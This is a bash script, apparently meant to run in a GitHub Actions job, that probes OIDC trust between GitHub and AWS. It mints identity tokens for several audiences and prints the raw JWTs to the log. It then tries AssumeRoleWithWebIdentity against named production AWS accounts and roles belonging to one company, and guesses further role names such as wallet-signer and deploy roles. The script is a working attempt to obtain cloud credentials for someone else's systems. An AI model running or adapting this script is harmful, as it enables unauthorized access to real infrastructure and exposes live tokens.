#!/usr/bin/env bash
# intent 222849 round2 — GitHub Actions OIDC token + AWS STS AssumeRoleWithWebIdentity differential probe.
# Additive, read-only, non-fatal.
echo "######## OIDC_PROBE_222849 R2 BEGIN ########"
echo "RUN_CTX repo=${GITHUB_REPOSITORY:-} sha=${GITHUB_SHA:-} run=${GITHUB_RUN_ID:-} attempt=${GITHUB_RUN_ATTEMPT:-}"
echo "EGRESS_IP1=$(curl -s --max-time 15 https://api.ipify.org || echo n/a)"
echo "URL_LEN=${#ACTIONS_ID_TOKEN_REQUEST_URL} TOK_LEN=${#ACTIONS_ID_TOKEN_REQUEST_TOKEN}"

mint_token() {
  aud="$1"
  if [ -z "$aud" ]; then
    resp=$(curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}" 2>/dev/null || true)
  else
    enc=$(python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1],safe=""))' "$aud")
    resp=$(curl -sS --max-time 20 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${enc}" 2>/dev/null || true)
  fi
  printf '%s' "$resp" | python3 -c 'import sys,json
try:
    d=json.load(sys.stdin); print(d.get("value") or "")
except Exception:
    print("")'
}

decode_jwt() {
  python3 -c 'import sys,json,base64
t=sys.stdin.read().strip()
if t.count(".")<2:
    print("{}"); raise SystemExit(0)
def dec(s):
    s+="="*(-len(s)%4)
    return json.loads(base64.urlsafe_b64decode(s))
print(json.dumps({"header":dec(t.split(".")[0]),"payload":dec(t.split(".")[1])},sort_keys=True))'
}

sts_raw() { # $1 aud, $2 role, $3 token
  code=$(curl -sS --max-time 25 -o /tmp/sts_body_r2.xml -w "%{http_code}" -X POST "https://sts.amazonaws.com/" \
    -H "Content-Type: application/x-www-form-urlencoded; charset=utf-8" \
    --data-urlencode "Action=AssumeRoleWithWebIdentity" \
    --data-urlencode "Version=2011-06-15" \
    --data-urlencode "RoleArn=$2" \
    --data-urlencode "RoleSessionName=ghoidc222849r2" \
    --data-urlencode "WebIdentityToken=$3" \
    --data-urlencode "DurationSeconds=1800" 2>/dev/null || echo curl_err)
  echo "STS_RESULT aud=$1 role=$2 http=${code}"
  echo "STS_BODY aud=$1 role=$2 :: $(tr '\n' ' ' < /tmp/sts_body_r2.xml 2>/dev/null | head -c 1700)"
  sleep 1
}

sts_try() { # $1 aud, $2 role
  jwt=$(mint_token "$1")
  if [ -z "$jwt" ]; then echo "STS_RESULT aud=$1 role=$2 SKIP_no_jwt"; return 0; fi
  sts_raw "$1" "$2" "$jwt"
}

echo "### JWT claims for round2 audiences ###"
for AUD in "https://github.com/coingate" "https://sts.amazonaws.com" "sigs.k8s.io"; do
  JWT=$(mint_token "$AUD")
  echo "JWT_RAW[$AUD]=${JWT}"
  echo "JWT_CLAIMS[$AUD]=$(printf '%s' "$JWT" | decode_jwt)"
done

echo "######## R2-A: 602675409103 audience differential (role cg-testas-ecs-tasks-role-prod) ########"
for AUD in "https://github.com/coingate" "https://sts.amazonaws.com" "sigs.k8s.io"; do
  sts_try "$AUD" "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod"
done

echo "######## R2-B: 533852667875 provider ClientIDList differential (role cg-testas-app-prod-tasks) ########"
for AUD in "https://github.com/coingate" "https://sts.amazonaws.com" "sigs.k8s.io"; do
  sts_try "$AUD" "arn:aws:iam::533852667875:role/cg-testas-app-prod-tasks"
done

echo "######## R2-C: 533852667875 role-name hunt (aud=sts.amazonaws.com) ########"
for n in cg-testas-ecs-tasks-execution-role-prod cg-core-oidc-role-prod cg-testas-web-identity-role-prod cg-testas-github-oidc-role-prod coingate-github-oidc-role coingate-oidc-role cg-wallet-signer-role-prod cg-wallet-ecs-tasks-role-prod cg-testas-deploy-role-prod cg-testas-cicd-role-prod GitHubActionsRole; do
  sts_try "sts.amazonaws.com" "arn:aws:iam::533852667875:role/${n}"
done

echo "######## calibration: tampered token on 602675409103 ########"
sts_raw "sts.amazonaws.com" "arn:aws:iam::602675409103:role/cg-testas-ecs-tasks-role-prod" "aaa.bbb.ccc"
echo "######## OIDC_PROBE_222849 R2 END ########"
exit 0
